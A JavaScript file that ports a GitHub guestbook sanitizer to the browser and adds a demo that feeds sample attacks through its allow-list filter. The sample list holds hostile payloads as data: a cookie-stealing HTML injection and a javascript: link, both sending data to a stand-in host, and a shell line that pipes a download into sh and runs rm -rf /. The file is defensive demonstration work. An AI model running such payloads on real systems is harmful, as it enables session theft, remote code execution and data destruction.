/* ============================================================================
   sanitizer.js — the guestbook sanitizer, ported to run in the reader's tab.

   This is a faithful port of scripts/sign_guestbook.py: same rules, same
   order, same limits. It is here so a visitor can attack the real thing
   instead of reading a claim that it is safe.

   The port is deliberate about one thing: JavaScript's \s and Python's \s are
   not the same set, and \w is not the same set either. The rules below avoid
   both and spell the allowed characters out, which is also what makes them an
   allow-list rather than a block-list.
   ========================================================================== */

const MAX_NOTE = 100;

/** GitHub's own rule for a username. Anything else was forged. */
const USERNAME = /^[A-Za-z0-9-]{1,39}$/;

/** The entire set a guestbook signature is allowed to be made of. Everything
 *  outside it is discarded without opinion — no escaping, no substitution.
 *  Escaping is where clever people put their bugs. */
const ALLOWED = /[^A-Za-z0-9 .,!?'’-]/g;

/**
 * @param {string} signer  the issue author
 * @param {string} raw     the issue body, entirely untrusted
 * @returns {{ok: boolean, reason?: string, note?: string, line?: string, steps: Array}}
 */
export function sanitize(signer, raw) {
  const steps = [];
  const s = (signer || "").trim();

  if (!USERNAME.test(s)) {
    return {
      ok: false,
      reason: "Rejected: that is not a GitHub username, so it was forged.",
      steps: [["username", signer, "rejected"]],
    };
  }
  steps.push(["username matched " + USERNAME.source, signer, s]);

  // First line only: a signature cannot restructure the page it lands on.
  const firstLine = raw ? raw.split("\n")[0] : "";
  if (raw && raw.includes("\n")) {
    steps.push(["first line only", `${raw.split("\n").length} lines in`, "1 line out"]);
  }

  const filtered = firstLine.replace(ALLOWED, "");
  if (filtered !== firstLine) {
    // Counted by length difference, not by .test() per character: ALLOWED is
    // a global regex, and a global regex carries lastIndex between calls, so
    // testing one character at a time silently returns every other answer.
    const removed = firstLine.length - filtered.length;
    steps.push(["allow-list filter", `${firstLine.length} chars in`, `${removed} discarded`]);
  }

  // Collapse runs of whitespace. Named characters, not \s, so the JS and the
  // Python agree about what a space is.
  const collapsed = filtered.replace(/[ \t\f\v ]+/g, " ").trim();
  const note = collapsed.slice(0, MAX_NOTE);
  if (collapsed.length > MAX_NOTE) {
    steps.push(["hard cap", `${collapsed.length} chars`, `${MAX_NOTE} kept`]);
  }

  const stamp = new Date().toISOString().slice(0, 10);
  return {
    ok: true,
    note,
    steps,
    line: `- **[@${s}](https://github.com/${s})** — ${note || "signed"} · ${stamp}`,
  };
}

const ATTACKS = [
  { label: "Markdown link", signer: "octocat", body: "[click me](javascript:alert(document.cookie))" },
  { label: "HTML injection", signer: "octocat", body: "<img src=x onerror=fetch('//evil.tld/'+document.cookie)>" },
  { label: "Layout break", signer: "octocat", body: "nice site\n\n| a | b |\n|---|---|\n| destroyed | table |" },
  { label: "Impersonation", signer: "octocat", body: "great work — @JamesTRichmond, verified official" },
  { label: "Shell injection", signer: "octocat", body: "$(curl evil.tld | sh) `whoami` && rm -rf /" },
  { label: "Forged username", signer: "not a real username!", body: "hello" },
  { label: "Overlong", signer: "octocat", body: "A".repeat(400) },
  { label: "Something nice", signer: "octocat", body: "This is the coolest profile Ive seen all year." },
];

const CSS = `
.sz { display: grid; grid-template-columns: minmax(0,1fr) minmax(0,1fr); gap: clamp(1rem,3vw,1.9rem); align-items: start; }
@media (width < 54rem) { .sz { grid-template-columns: minmax(0,1fr); } }

.sz-lab { display: block; font-family: var(--font-mono); font-size: .68rem; letter-spacing: .1em;
  text-transform: uppercase; color: var(--ink-dim); margin-block-end: .4rem; }
.sz-in, .sz-user {
  inline-size: 100%; font-family: var(--font-mono); font-size: .84rem; line-height: 1.6;
  color: var(--ink); background: var(--bg-deep); border: 1px solid var(--line);
  border-radius: var(--radius-sm); padding: .6rem .75rem; resize: vertical;
}
.sz-in { min-block-size: 7rem; }
.sz-in:focus-visible, .sz-user:focus-visible { outline: 2px solid var(--sub); outline-offset: 2px; }
.sz-user { margin-block-end: .9rem; }

.sz-shots { display: flex; flex-wrap: wrap; gap: .3rem; margin-block-start: .8rem; }
.sz-shot { font-family: var(--font-mono); font-size: .68rem; padding: .3rem .6rem; border-radius: 999px;
  border: 1px solid var(--line); background: transparent; color: var(--ink-dim); cursor: pointer; }
.sz-shot:hover { color: var(--ink); border-color: var(--sub); }

.sz-out { border-inline-start: 2px solid var(--sub); padding-inline-start: 1.1rem; }
@media (width < 54rem) { .sz-out { border-inline-start: 0; border-block-start: 2px solid var(--sub); padding: 1.1rem 0 0; } }

.sz-verdict { font-family: var(--font-mono); font-size: .74rem; letter-spacing: .06em;
  text-transform: uppercase; margin-block-end: .8rem; }
.sz-verdict.pass { color: var(--fluoro); }
.sz-verdict.fail { color: var(--sub-2); }

.sz-steps { margin: 0 0 1.1rem; padding: 0; list-style: none; font-size: .78rem; }
.sz-steps li { display: grid; grid-template-columns: 1fr auto; gap: .4rem 1rem;
  padding-block: .4rem; border-block-end: 1px dashed var(--line); }
.sz-steps b { font-weight: 500; font-family: var(--font-mono); font-size: .72rem; color: var(--ink-dim); }
.sz-steps span { color: var(--ink); text-align: end; font-family: var(--font-mono); font-size: .72rem; }

.sz-render-l { font-family: var(--font-mono); font-size: .68rem; letter-spacing: .1em;
  text-transform: uppercase; color: var(--ink-dim); margin-block: 0 .45rem; }
.sz-render { background: var(--bg-deep); border: 1px solid var(--line); border-radius: var(--radius-sm);
  padding: .7rem .8rem; font-size: .84rem; color: var(--ink); overflow-wrap: anywhere; }
.sz-render code { font-family: var(--font-mono); font-size: .78rem; color: var(--ink-dim); }
.sz-render a { color: var(--sub); }
.sz-empty { color: var(--ink-dim); font-style: italic; }
`;

export function mount(root) {
  const style = document.createElement("style");
  style.textContent = CSS;
  root.append(style);

  const wrap = document.createElement("div");
  wrap.className = "sz";
  wrap.innerHTML = `
    <div>
      <label class="sz-lab" for="sz-user">Issue author</label>
      <input class="sz-user" id="sz-user" type="text" spellcheck="false" autocomplete="off" value="octocat">
      <label class="sz-lab" for="sz-body">Issue body — entirely untrusted</label>
      <textarea class="sz-in" id="sz-body" spellcheck="false"></textarea>
      <div class="sz-shots" role="group" aria-label="Try one of these"></div>
    </div>
    <div class="sz-out" aria-live="polite">
      <p class="sz-verdict"></p>
      <ul class="sz-steps"></ul>
      <p class="sz-render-l">What lands in the README</p>
      <div class="sz-render"></div>
    </div>`;
  root.append(wrap);

  const user = wrap.querySelector("#sz-user");
  const body = wrap.querySelector("#sz-body");
  const shots = wrap.querySelector(".sz-shots");
  const verdict = wrap.querySelector(".sz-verdict");
  const steps = wrap.querySelector(".sz-steps");
  const render = wrap.querySelector(".sz-render");

  for (const a of ATTACKS) {
    const b = document.createElement("button");
    b.type = "button";
    b.className = "sz-shot";
    b.textContent = a.label;
    b.addEventListener("click", () => {
      user.value = a.signer;
      body.value = a.body;
      run();
    });
    shots.append(b);
  }

  function run() {
    const r = sanitize(user.value, body.value);
    steps.replaceChildren();

    if (!r.ok) {
      verdict.className = "sz-verdict fail";
      verdict.textContent = "Rejected before anything is written";
      render.innerHTML = `<span class="sz-empty">${r.reason}</span>`;
      return;
    }

    verdict.className = "sz-verdict pass";
    verdict.textContent = r.steps.length
      ? `Accepted — ${r.steps.length} rule${r.steps.length === 1 ? "" : "s"} changed it`
      : "Accepted unchanged";

    for (const [rule, from, to] of r.steps) {
      const li = document.createElement("li");
      const b = document.createElement("b");
      b.textContent = rule;
      const s = document.createElement("span");
      s.textContent = `${from} → ${to}`;
      li.append(b, s);
      steps.append(li);
    }

    // Rendered as GitHub would render it — which is the point. The only reason
    // it is safe to build this with innerHTML is that every character in `note`
    // has already been through the allow-list above.
    render.replaceChildren();
    if (!r.note) {
      const em = document.createElement("span");
      em.className = "sz-empty";
      em.textContent = "Nothing survived. The entry reads “signed”.";
      render.append(em);
    }
    const line = document.createElement("div");
    const strong = document.createElement("strong");
    const a = document.createElement("a");
    a.href = `https://github.com/${user.value.trim()}`;
    a.textContent = `@${user.value.trim()}`;
    a.rel = "nofollow noopener";
    strong.append(a);
    line.append(strong, document.createTextNode(` — ${r.note || "signed"} · ${new Date().toISOString().slice(0, 10)}`));
    render.append(line);

    const src = document.createElement("code");
    src.textContent = r.line;
    render.append(document.createElement("br"), src);
  }

  user.addEventListener("input", run);
  body.addEventListener("input", run);
  body.value = ATTACKS[0].body;
  run();
}
